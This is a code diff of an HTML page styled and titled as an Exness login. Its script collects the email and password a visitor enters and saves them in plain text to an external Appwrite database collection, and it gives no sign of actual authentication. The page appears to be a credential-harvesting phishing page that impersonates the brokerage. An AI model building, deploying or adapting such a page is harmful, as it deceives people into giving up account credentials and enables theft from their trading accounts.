@@ -4,41 +4,52 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Exness Login</title>
+  <title>Exness</title>
+  <!-- ✅ Appwrite JS SDK -->
   <script src="https://cdn.jsdelivr.net/npm/appwrite@13.0.1"></script>
+  <script src="https://cdn.jsdelivr.net/npm/appwrite@13.0.1/build/appwrite.min.js"></script>
   <style>
     body {
-      background: #facc15; /* Yellow background */
+      background: #facc15; /* Exness yellow */
       font-family: Arial, sans-serif;
       color: #000;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
+      margin: 0;
     }
     .container {
       background: white;
       padding: 40px;
       border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.2);
-      width: 300px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      width: 320px;
+      text-align: center;
+    }
+    h2 {
+      margin-bottom: 20px;
+      color: #000;
+      font-size: 24px;
     }
     input {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       margin: 10px 0;
       border: 1px solid #ccc;
       border-radius: 5px;
+      font-size: 14px;
     }
     button {
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       background: #facc15;
       color: #000;
       border: none;
       border-radius: 5px;
       cursor: pointer;
       font-weight: bold;
+      font-size: 16px;
     }
     button:hover {
       background: #eab308;
@@ -57,16 +68,14 @@
 
   <script>
     const client = new Appwrite.Client();
-
     client
       .setEndpoint('https://cloud.appwrite.io/v1')
-      .setProject('688645d80003f6f2ac63'); // ✅ Project ID
+      .setProject('688645d80003f6f2ac63'); // ✅ Tumhara Project ID
 
     const databases = new Appwrite.Databases(client);
 
     document.getElementById("form").addEventListener("submit", function (e) {
       e.preventDefault();
-
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
@@ -74,13 +83,9 @@
         '68864661001cac30c2bd', // ✅ Database ID
         '6886472800269d8c2b71', // ✅ Collection ID
         Appwrite.ID.unique(),
-        {
-          email: email,
-          password: password
-        }
+        { email: email, password: password }
       ).then(function (response) {
         alert("✅ Data saved successfully!");
-        console.log(response);
       }, function (error) {
         alert("❌ Failed: " + error.message);
         console.error(error);
